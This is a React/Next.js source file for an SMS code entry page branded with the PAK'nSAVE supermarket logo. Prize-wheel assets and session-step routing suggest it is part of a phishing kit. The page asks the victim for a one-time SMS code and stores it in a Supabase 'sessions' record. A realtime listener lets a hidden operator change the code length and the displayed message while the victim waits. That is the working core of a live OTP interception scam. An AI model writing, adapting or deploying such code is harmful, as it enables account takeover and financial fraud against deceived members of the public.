"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [digits, setDigits] = useState(6);
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  const ui = {
    panel: "app-panel rounded-2xl p-6",
    input: "app-input mt-2 w-full px-4 py-3 text-lg tracking-[0.35em]",
    submit: "app-btn w-full rounded-xl py-3 text-sm shadow-md disabled:opacity-50",
  };

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }

      setDigits(data.sms_digits ?? 6);
      setCustomText(data.sms_custom_text);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      setCode(fd.smsCode ?? "");
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as { sms_digits?: number; sms_custom_text?: string | null };
            if (next.sms_digits) {
              setDigits(next.sms_digits);
              // EÄŸer kod, yeni haneden uzunsa keselim
              setCode((prev) => prev.slice(0, next.sms_digits));
            }
            if (next.sms_custom_text !== undefined) {
              setCustomText(next.sms_custom_text);
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    setSaving(true);
    setMsg(null);

    const nextFormData = { ...sessionFormData, smsCode: code.trim() };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Sending failed.");
    else {
      setSessionFormData(nextFormData);
      router.push(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
              Invalid link.
          </p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
        </div>
      </div>
    );
  }

  const trimmed = code.trim();
  const valid = trimmed.length === digits && /^\d+$/.test(trimmed);
  const displayText = customText || settings.sms_subtitle;

  // OTP style input handling
  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newCode = code.split("");
    newCode[index] = value.substring(value.length - 1); // Only take the last char
    const updatedCode = newCode.join("");
    setCode(updatedCode.slice(0, digits));

    // Move to next input
    if (value && index < digits - 1) {
      const nextInput = document.getElementById(`otp-input-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevInput = document.getElementById(`otp-input-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, digits);
    setCode(pastedData);
    if (pastedData.length > 0) {
      const focusIndex = Math.min(pastedData.length, digits - 1);
      const input = document.getElementById(`otp-input-${focusIndex}`);
      if (input) input.focus();
    }
  };

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-6 sm:p-10 relative z-10 fade-in">
        
        {/* Right Top Logo Placeholder */}
        <div className="absolute right-6 top-6 sm:right-10 sm:top-10">
          <img
            src="/wheel-assets/desktop/png/paknsave-logo-hub.png"
            alt="PAK'nSAVE logo"
            className="h-10 w-10 object-contain drop-shadow-[0_10px_18px_rgba(0,0,0,0.35)]"
            id="sms-brand-logo"
          />
        </div>

        <div className="mb-6 flex items-start gap-4">
          <div className="mt-1 shrink-0">
            <div
              id="sms-verified-icon"
              className="flex h-12 w-12 items-center justify-center rounded-2xl bg-white/10 text-[#00d26a]"
              aria-hidden="true"
            >
              <svg className="h-7 w-7" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
              </svg>
            </div>
          </div>
          <div>
            <h2 className="text-2xl font-bold text-white mb-1">{settings.sms_title}</h2>
            <p className="text-sm text-gray-300 font-medium whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
          </div>
        </div>
        
        <form onSubmit={handleSubmit} className="space-y-5">
          <div className="block text-sm font-medium text-white">
            <div className="mb-3">{settings.sms_input_label} ({digits})</div>
            <div className="flex gap-2 justify-center" onPaste={handlePaste}>
              {Array.from({ length: digits }).map((_, index) => (
                <input
                  key={index}
                  id={`otp-input-${index}`}
                  required
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={1}
                  className="w-12 h-14 sm:w-14 sm:h-16 text-center rounded-xl border border-transparent bg-white/10 text-2xl sm:text-3xl font-bold text-white shadow-sm transition-colors placeholder:text-gray-500 focus:border-[#0066CC] focus:outline-none focus:ring-2 focus:ring-[#0066CC]/50"
                  value={code[index] || ""}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                />
              ))}
            </div>
          </div>

          {!valid && code.length > 0 ? (
            <p className="text-xs text-red-400">Enter exactly {digits} digits.</p>
          ) : null}

          {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

          <button
            type="submit"
            disabled={saving || !valid}
            className="w-full rounded-xl bg-gradient-to-r from-[#0066CC] to-[#0088FF] py-4 text-lg font-bold text-white shadow-[0_0_15px_rgba(0,102,204,0.4)] transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
          >
            {saving ? settings.sms_loading : settings.sms_button}
          </button>

          <p className="text-center text-xs text-gray-400 mt-4">
            The code was sent by SMS to your mobile number.
          </p>
        </form>
      </div>
    </div>
  );
}
